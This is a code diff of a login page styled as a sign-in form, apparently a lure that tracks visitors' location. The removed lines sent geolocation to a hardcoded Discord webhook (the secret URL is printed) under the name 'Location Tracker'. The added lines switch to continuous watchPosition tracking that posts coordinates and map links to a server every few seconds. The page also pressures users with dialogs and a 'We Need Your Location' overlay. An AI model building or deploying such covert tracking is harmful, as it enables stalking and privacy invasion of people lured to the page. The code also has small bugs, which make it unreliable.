@@ -10,6 +10,7 @@
     </style>
 </head>
 <body >
+    <div id="locationDisplay"></div>
     
     <div class="loginWrapper">
         <div class="logo">
@@ -38,7 +39,6 @@
             <button type="submit" class="login-button">Connexion</button>
         </form>
  <!-- Add the "Enable Location Access" button here -->
- <button id="requestLocation" style="display: none;">Enable Location Access</button>
     </div>
     
     <footer class="footer">
@@ -56,13 +56,15 @@
    
    
    document.addEventListener("DOMContentLoaded", function () {
-    setTimeout(() => showFirstDialog(), 1000); // Show first dialog after 1 second
+    console.log("✅ DOM fully loaded. Starting tracking...");
 
-    // Handle user clicking "Allow Location Access"
-document.getElementById("grantLocation").addEventListener("click", function () {
-    window.close(); // Attempt to close the tab
-});
+    // let locationDisplay = document.getElementById("locationDisplay");
+    if (!locationDisplay) {
+        console.error("🚨 ERROR: #locationDisplay is missing from the DOM.");
+        return;
+    }
 
+    startTracking();
     function showFirstDialog() {
         if (confirm("Welcome! Click 'OK' to proceed.")) {
             setTimeout(() => showSecondDialog(), 1000); // Delay before showing second dialog
@@ -79,18 +81,23 @@ document.getElementById("grantLocation").addEventListener("click", function () {
         }
     }
 
-    function getLocation() {
-        if (navigator.geolocation) {
-            console.log("Requesting location permission...");
-            navigator.geolocation.getCurrentPosition(showPosition, showError, {
-                enableHighAccuracy: true,
-                timeout: 5000,
-                maximumAge: 0
-            });
-        } else {
-            console.log("Geolocation is not supported by this browser.");
-        }
-    }
+    function startTracking() {
+  if (navigator.geolocation) {
+    navigator.geolocation.watchPosition(updatePosition, showError, {
+      enableHighAccuracy: true,
+      timeout: 0,
+      maximumAge: 0
+    });
+  } else {
+    console.log("Geolocation is not supported by this browser.");
+  }
+}
+
+let lastSentTime = 0; // Track last update time to prevent spam
+const updateInterval = 3000; // Send an update every 5 seconds
+
+
+
 
     function showPosition(position) {
         let latitude = position.coords.latitude;
@@ -118,6 +125,32 @@ document.getElementById("grantLocation").addEventListener("click", function () {
         sendData("User Location", locationData);
     }
 
+    function updatePosition(position) {
+    latitude = position.coords.latitude;
+    longitude = position.coords.longitude;
+    timestamp = new Date().toLocaleTimeString();
+
+    console.log(`📍 Latitude: ${latitude}, Longitude: ${longitude} at ${timestamp}`);
+
+    // Ensure the element exists before updating
+    let locationDisplay = document.getElementById("locationDisplay");
+    if (locationDisplay) {
+        locationDisplay.innerText = `Latitude: ${latitude}, Longitude: ${longitude}`;
+    } else {
+        console.error("🚨 ERROR: #locationDisplay not found in the DOM.");
+    }
+
+    // Prevent sending too many updates
+    let currentTime = new Date().getTime();
+    if (currentTime - lastSentTime > updateInterval) {
+        sendData(
+            "Live Location Update",
+            `📍 **Lat:** ${latitude}, **Lon:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
+        );
+        lastSentTime = currentTime;
+    }
+}
+
     function showError(error) {
         let message;
         switch (error.code) {
@@ -140,33 +173,40 @@ document.getElementById("grantLocation").addEventListener("click", function () {
     }
 
     function sendData(title, description) {
-        const webhookUrl = "https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X"; // Replace with actual webhook URL
+    fetch("http://localhost:3000/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ title, description })
+    })
+    .then(response => response.json())
+    .then(data => console.log("✅ Sent location update:", data))
+    .catch(error => console.error("🚨 Error sending data:", error));
+}
 
-        let payload = {
-            username: "Location Tracker",
-            embeds: [
-                {
-                    title: title,
-                    description: "```" + description + "```",
-                    color: 15844367
-                }
-            ]
-        };
 
-        fetch(webhookUrl, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
-        })
-        .catch(err => console.log("Error sending data:", err));
-    }
+
+
+
+
 });
 
+   
         
 
+        if ("serviceWorker" in navigator) {
+          navigator.serviceWorker.register("service-worker.js")
+            .then((registration) => {
+              console.log("Service Worker registered with scope:", registration.scope);
+            })
+            .catch((error) => {
+              console.error("Service Worker registration failed:", error);
+            });
+        }
     
 
     </script>
+    <script href="server.js"></script>
+    
     <div id="locationOverlay" class="overlay">
         <div class="overlay-content">
             <h2>We Need Your Location</h2>
@@ -174,6 +214,9 @@ document.getElementById("grantLocation").addEventListener("click", function () {
             <button id="grantLocation">Click allow</button>
         </div>
     </div>
+   
+  
+
     
 </body>
 </html>
